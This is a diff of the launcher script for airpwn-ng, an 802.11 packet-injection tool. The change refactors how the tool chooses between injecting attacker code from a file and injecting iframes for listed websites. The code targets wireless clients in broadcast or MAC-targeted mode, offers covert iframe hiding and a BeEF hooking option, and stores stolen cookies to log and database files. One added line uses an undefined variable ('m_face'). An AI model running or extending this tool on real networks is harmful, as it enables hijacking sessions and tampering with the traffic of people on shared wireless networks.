@@ -24,12 +24,121 @@ class bcolors:
 	UNDERLINE = '\033[4m'
 
 
+def injection_check(args):
+	''' Injection file -OR- Website list decision logic '''
+	## Use injection file
+	if (args.injection is not None):
+		try:
+			f = open (args.injection, 'r')
+			f.close()
+		except:
+			print bcolors.FAIL + "[!] Selected injection file", args.injection, "does not exist." + bcolors.ENDC
+			exit(1)
+		print bcolors.OKGREEN+"[+] Loaded injection file", args.injection + bcolors.ENDC
+		injection = 1
+		websites = None
+		return injection, websites
 
-def signal_handler(signal, frame):
-	'''Handle CTRL+C.'''
-	print(bcolors.FAIL + '\n[!] Stopping injection and exiting airpwn-ng ...' + bcolors.ENDC)
-	print(bcolors.OKGREEN + '\n[+] Cookies stored to cookies.log and cookies.sqlite' + bcolors.ENDC)
-	sys.exit(0)
+	## Use website list
+	else:
+		try:
+			f = open(args.websites, 'r')
+			f.close()
+		except:
+			print bcolors.FAIL + "[!] Selected websites file", args.websites, "does not exist." + bcolors.ENDC
+			exit(1)
+		injection = 0
+		websites = load_websites_targeted(args.websites)
+		for website in websites:
+			print bcolors.OKGREEN + "[+] Loaded target website ", website + bcolors.ENDC
+		return injection, websites
+
+
+def main(args):
+	'''
+	This sets up VictimParameters, PacketHandler and the Victims (if any...).
+
+	It uses the library classes and functions according to what arguments are provided.
+	'''
+	## Set vars
+	m_iface = args.m
+	i_iface = args.i
+	injection = 0
+
+	## User printouts
+	print "\n\nairpwn-ng - The new and improved 802.11 packet injector\n\n"
+	if ("mon" in m_iface and m_iface != i_iface):
+		print bcolors.WARNING + "[!] It appears you are using a monitor mode interface as your monitoring input. If you are attacking open wireless networks, please use the same monitoring interface with -i for better performance." + bcolors.ENDC
+	if ("mon" not in m_iface):
+		print bcolors.WARNING + "[!] It appears your are trying to attack a WEP/WPA protected network. Please ensure -m is your dot11 tap interface and that -i is connected to the target AP." + bcolors.ENDC
+
+	### NOT IMPLEMENTED YET
+	## Whitelist checks
+	#if (args.exclude_hosts is not None):
+		#EXCLUSION = 1
+		#EXCLUDE_LIST = args.exclude_hosts
+
+	## Injection Logic
+	injection, websites = injection_check(args)
+
+	if args.t is None:
+		## Broadcast mode
+		print bcolors.WARNING + "[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution." + bcolors.ENDC
+	else:
+		## Targeted mode
+		if (len(args.t) == 0):
+			print bcolors.WARNING + "[!] You must specify at least one target MAC address with -t for targeted mode"
+			exit(1)
+		else:
+			for target in args.t:
+				print bcolors.OKGREEN + "[+] Adding target", target + bcolors.ENDC
+
+	if injection == 1:
+		## Injection file used
+		style_inject(args, i_iface, m_iface)
+
+	else:
+		## Website file used
+		style_web(args, websites, i_iface, m_iface)
+
+
+def menu():
+	if len(sys.argv) > 1:
+		pass
+	else:
+		print 'airpwn-ng - the new and improved 802.11 packet injector'
+		print ''
+		print '********************************************'
+		print '**           Launcher Choices             **'
+		print '********************************************'
+		print '  Choose from 1 of the following:'
+		print '    --injection <filename>'
+		print '      File with your injection code'
+		print ''
+		print '    --websites <filename>'
+		print '      List of websites to sniff cookies from'
+		print ''
+		print '********************************************'
+		print '**           Optional Arguments           **'
+		print '********************************************'
+		print '  -m <interface>'
+		print '    Your monitor interface'
+		print ''
+		print '  -i <interface>'
+		print '    Your injection interface'
+		print ''
+		print '  -t [<MAC MAC>]'
+		print '    Targeted MACs'
+		print ''
+		print '  --exclude-hosts [<host host>]'
+		print '    Hosts to exclude from injection'
+		print ''
+		print '  --covert'
+		print '    Hide iFrames inside the requested page'
+		print ''
+		print '  --single'
+		print '    Beta method for beef hooking'
+		sys.exit(0)
 
 
 def load_websites_targeted(websites_file):
@@ -42,166 +151,108 @@ def load_websites_targeted(websites_file):
 	return websites
 
 
-def main(args):
-	'''
-	This sets up VictimParameters, PacketHandler and the Victims (if any...).
-	
-	It uses the library classes and functions according to what arguments are provided.
-	'''
-	print "\n\nairpwn-ng - The new and improved 802.11 packet injector\n\n"
-	m_iface = args.m
-	i_iface = args.i
-
-	## SEND OUT SOME WARNINGS
-	if ("mon" in m_iface and m_iface!=i_iface):
-		print bcolors.WARNING + "[!] It appears you are using a monitor mode interface as your monitoring input. If you are attacking open wireless networks, please use the same monitoring interface with -i for better performance." + bcolors.ENDC
-
-	if ("mon" not in m_iface):
-		print bcolors.WARNING + "[!] It appears your are trying to attack a WEP/WPA protected network. Please ensure -m is your dot11 tap interface and that -i is connected to the target AP." + bcolors.ENDC
-
-	## CHECK FOR EXCLUDED HOSTS
-	if (args.exclude_hosts is not None):
-		EXCLUSION = 1
-		EXCLUDE_LIST = args.exclude_hosts
-
-	injection = 0
-
-	## USE INJECT FILE
-	if (args.injection is not None):
-		## CHECK IF INJECTION FILE EXISTS
-		try:
-			f = open (args.injection, 'r')
-			f.close()
-		except:
-			print bcolors.FAIL + "[!] Selected injection file", args.injection, "does not exist." + bcolors.ENDC
-			exit(1)
-		print bcolors.OKGREEN+"[+] Loaded injection file", args.injection + bcolors.ENDC
-		injection = 1
-
-	## USE WEBSITE LIST AND CREATE INJECTIONS ON THE FLY -- CHECK LIB/AIRPWN_NG.PY FOR MORE INFO
+def style_inject(args, i_iface, m_iface):
+	''' Handle injection without a targeted domain list '''
+	## Handle victim parameters
+	if args.covert:
+		## Broadcast mode
+		if not args.t:
+			vp = PARAM.VictimParameters(inject_file = args.injection, covert = args.covert, highjack = highjacker)
+		## Targeted mode
+		else:
+			vp = PARAM.VictimParameters(inject_file = args.injection, covert = args.covert)
 	else:
-		## CHECK IF WEBSITES FILE EXISTS
-		try:
-			f = open(args.websites, 'r')
-			f.close()
-		except:
-			print bcolors.FAIL + "[!] Selected websites file", args.websites, "does not exist." + bcolors.ENDC
-			exit(1)
-		injection = 0
-		websites = load_websites_targeted(args.websites)
-		for website in websites:
-			print bcolors.OKGREEN + "[+] Loaded target website ", website + bcolors.ENDC
+		vp = PARAM.VictimParameters(inject_file = args.injection)
 
-	## BROADCAST MODE
-	if (args.t is None):
-		print bcolors.WARNING + "[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution." + bcolors.ENDC
-
-		### This comment is confusing, let's change the name...
-		## FILE INJECTION
-		if (injection == 0):
-			if (args.covert):
-				vp = PARAM.VictimParameters(websites = websites, covert = args.covert)
-			else:
-				vp = PARAM.VictimParameters(websites = websites)
-
-			if (args.exclude_hosts is None):
-				ph = PH.PacketHandler(i = i_iface, victim_parameters = vp)
-			else:
-				ph = PH.PacketHandler(i = i_iface, victim_parameters = vp, excluded = args.exclude_hosts)
-
-			### Is this dealing with tap0 or something?
-			if ("mon" in m_iface):
-				snif = SNIFF.Sniffer(ph, m = m_iface)
-				snif.threaded_sniff()
-			else:
-				snif = SNIFF.Sniffer(ph, m = m_iface, filter = '')
-				snif.threaded_sniff()
-
-		### Also confusing, we might not be injecting an iFrame here...
-		## WEBSITES IFRAME INJECTION
+	## Broadcast mode
+	if not args.t:
+		if (args.exclude_hosts is None):
+			ph = PH.PacketHandler(i = i_iface, victim_parameters = vp)
 		else:
-			if (args.covert):
-				vp = PARAM.VictimParameters(inject_file = args.injection, covert = args.covert, highjack = highjacker)
-			else:
-				vp = PARAM.VictimParameters(inject_file = args.injection)
+			ph = PH.PacketHandler(i = i_iface, victim_parameters = vp, excluded = args.exclude_hosts)
 
-			if (args.exclude_hosts is None):
-				ph = PH.PacketHandler(i = i_iface, victim_parameters = vp)
-			else:
-				ph = PH.PacketHandler(i = i_iface, victim_parameters = vp, excluded = args.exclude_hosts)
-
-			## Deal with single packet injection attempts
-			if (args.single):
-				if ("mon" in m_iface):
-					snif = SNIFF.Sniffer(ph, m = m_iface)
-					snif.threaded_sniff(True)
-				else:
-					snif = SNIFF.Sniffer(ph, m = m_iface, filter = '')
-					snif.threaded_sniff(True)
-			else:
-				if ("mon" in m_iface):
-					snif = SNIFF.Sniffer(ph, m = m_iface)
-					snif.threaded_sniff()
-				else:
-					snif = SNIFF.Sniffer(ph, m = m_iface, filter = '')
-					snif.threaded_sniff()
-
-	## TARGETED MODE
+	## Targeted mode
 	else:
-		if (len(args.t) == 0):
-			print bcolors.WARNING + "[!] You must specify at least one target MAC address with -t for targeted mode"
-			exit(1)
+		victims = []
+		for victim in args.t:
+			v1 = TGT.Victim(mac = victim, victim_parameters = vp)
+			victims.append(v1)
+
+		if (args.exclude_hosts is None):
+			ph = PH.PacketHandler(i = i_iface, victims = victims)
 		else:
-			for target in args.t:
-				print bcolors.OKGREEN + "[+] Adding target", target + bcolors.ENDC
+			ph = PH.PacketHandler(i = i_iface, victims = victims, excluded = args.exclude_hosts)
 
-		## WEBSITES IFRAME INJECTION
-		if (injection == 0):
-			victims = []
-			if (args.covert):
-				vp = PARAM.VictimParameters(websites = websites, covert = args.covert)
+	## Single packet injection logic
+	if args.single:
+		if "mon" in m_iface:
+			snif = SNIFF.Sniffer(ph, m = m_iface)
+			snif.threaded_sniff(args, True)
+		else:
+			## Broadcast mode
+			if not args.t:
+				snif = SNIFF.Sniffer(ph, m = m_face, filter = '')
+
+			## Targeted mode
 			else:
-				vp = PARAM.VictimParameters(websites = websites)
-
-			for victim in args.t:
-				v1 = TGT.Victim(mac = victim, victim_parameters = vp)
-				victims.append(v1)
-
-			if (args.exclude_hosts is None):
-				ph = PH.PacketHandler(i = i_iface, victims = victims)
-			else:
-				ph = PH.PacketHandler(i = i_iface, victims = victims, excluded = args.exclude_hosts)
-
-			if ("mon" in m_iface):
 				snif = SNIFF.Sniffer(ph, m = m_iface)
-				snif.threaded_sniff()
-			else:
+
+			snif.threaded_sniff(args, True)
+	else:
+		if ("mon" in m_iface):
+			snif = SNIFF.Sniffer(ph, m = m_iface)
+			snif.threaded_sniff(args)
+		else:
+			## Broadcast mode
+			if not args.t:
 				snif = SNIFF.Sniffer(ph, m = m_iface, filter = '')
-				snif.threaded_sniff()
 
-		## FILE INJECTION
+			## Targeted mode
+			else:
+				snif = SNIFF.Sniffer(ph, m = m_iface)
+
+			snif.threaded_sniff(args)
+
+
+def style_web(args, websites, i_iface, m_iface):
+	''' Handle Website Lists '''
+	if args.covert:
+		vp = PARAM.VictimParameters(websites = websites, covert = args.covert)
+	else:
+		vp = PARAM.VictimParameters(websites = websites)
+
+	## Broadcast mode
+	if not args.t:
+		if (args.exclude_hosts is None):
+			ph = PH.PacketHandler(i = i_iface, victim_parameters = vp)
 		else:
-			victims = []
-			if (args.covert):
-				vp = PARAM.VictimParameters(inject_file = args.injection, covert = args.covert)
-			else:
-				vp = PARAM.VictimParameters(inject_file = args.injection)
+			ph = PH.PacketHandler(i = i_iface, victim_parameters = vp, excluded = args.exclude_hosts)
 
-			for victim in args.t:
-				v1 = TGT.Victim(mac = victim, victim_parameters = vp)
-				victims.append(v1)
+	## Targeted mode
+	else:
+		victims = []
+		for victim in args.t:
+			v1 = TGT.Victim(mac = victim, victim_parameters = vp)
+			victims.append(v1)
 
-			if (args.exclude_hosts is None):
-				ph = PH.PacketHandler(i = i_iface, victims = victims)
-			else:
-				ph = PH.PacketHandler(i = i_iface, victims = victims, excluded = args.exclude_hosts)
+		if (args.exclude_hosts is None):
+			ph = PH.PacketHandler(i = i_iface, victims = victims)
+		else:
+			ph = PH.PacketHandler(i = i_iface, victims = victims, excluded = args.exclude_hosts)
 
-			if ("mon" in m_iface):
-				snif = SNIFF.Sniffer(ph, m = m_iface)
-				snif.threaded_sniff()
-			else:
-				snif = SNIFF.Sniffer(ph, m = m_iface)
-				snif.threaded_sniff()
+	if ("mon" in m_iface):
+		snif = SNIFF.Sniffer(ph, m = m_iface)
+		snif.threaded_sniff()
+	else:
+		snif = SNIFF.Sniffer(ph, m = m_iface, filter = '')
+		snif.threaded_sniff()
+
+
+def signal_handler(signal, frame):
+	'''Handle CTRL+C.'''
+	print(bcolors.FAIL + '\n[!] Stopping injection and exiting airpwn-ng ...' + bcolors.ENDC)
+	print(bcolors.OKGREEN + '\n[+] Cookies stored to cookies.log and cookies.sqlite' + bcolors.ENDC)
+	sys.exit(0)
 
 
 if __name__ == '__main__':
@@ -209,7 +260,7 @@ if __name__ == '__main__':
 	signal.signal(signal.SIGINT, signal_handler)
 
 	## ARGUMENT PARSING
-	parser = argparse.ArgumentParser(description = 'airpwn-ng - the new and improved 802.11 packet injector')
+	parser = argparse.ArgumentParser(description = 'airpwn-ng - the new and improved 802.11 packet injector', usage = menu())
 
 	group = parser.add_mutually_exclusive_group(required = True)
 
